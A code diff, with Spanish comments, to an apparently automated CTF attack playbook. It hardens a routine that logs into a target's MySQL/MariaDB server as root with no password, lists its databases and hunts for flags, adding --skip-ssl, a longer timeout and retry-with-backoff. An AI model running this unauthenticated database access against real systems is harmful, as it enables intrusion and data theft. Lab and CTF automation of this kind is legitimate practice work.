@@ -248,8 +248,23 @@ def pb_rsync(client, target, steps) -> list:
 
 def pb_mysql(client, target, steps) -> list:
     """Estilo Sequel: MySQL/MariaDB root SIN contraseña -> vuelca bases -> caza flags."""
-    base = f"mysql -h {target} -u root --connect-timeout=8 -N"
-    show = _run(client, f"{base} -e 'show databases;' 2>&1", timeout=30)
+    # El cliente de la Kali es MariaDB: usa --skip-ssl (NO el --ssl-mode de MySQL),
+    # si no, el handshake aborta con ERROR 2026 "SSL is required...".
+    # OJO con --connect-timeout: Sequel tarda >8s en completar el handshake recién
+    # spawneada; un timeout corto da ERROR 2013 / system error 110 (ETIMEDOUT) en
+    # falso. 30s deja margen de sobra (validado: con 8s fallaba, sin él/30s entra).
+    base = f"mysql -h {target} -u root --skip-ssl --connect-timeout=30 -N"
+    # Aun así, una caja recién arrancada puede no responder al primer intento:
+    # reintento con backoff antes de rendirse.
+    show = ""
+    for intento in range(4):
+        show = _run(client, f"{base} -e 'show databases;' 2>&1", timeout=45)
+        if not any(s in show for s in ("ERROR 2013", "Lost connection", "Can't connect", "[TIMEOUT")):
+            break
+        if intento < 3:
+            _step(steps, "ENUM", "MySQL conexión",
+                  f"handshake falló (intento {intento + 1}/4), reintento con backoff", show.strip())
+            _run(client, f"sleep {3 * (intento + 1)}", timeout=20)
     if "Access denied" in show:
         _step(steps, "ENUM", "MySQL root sin contraseña", "acceso denegado (requiere pass)", show)
         return []
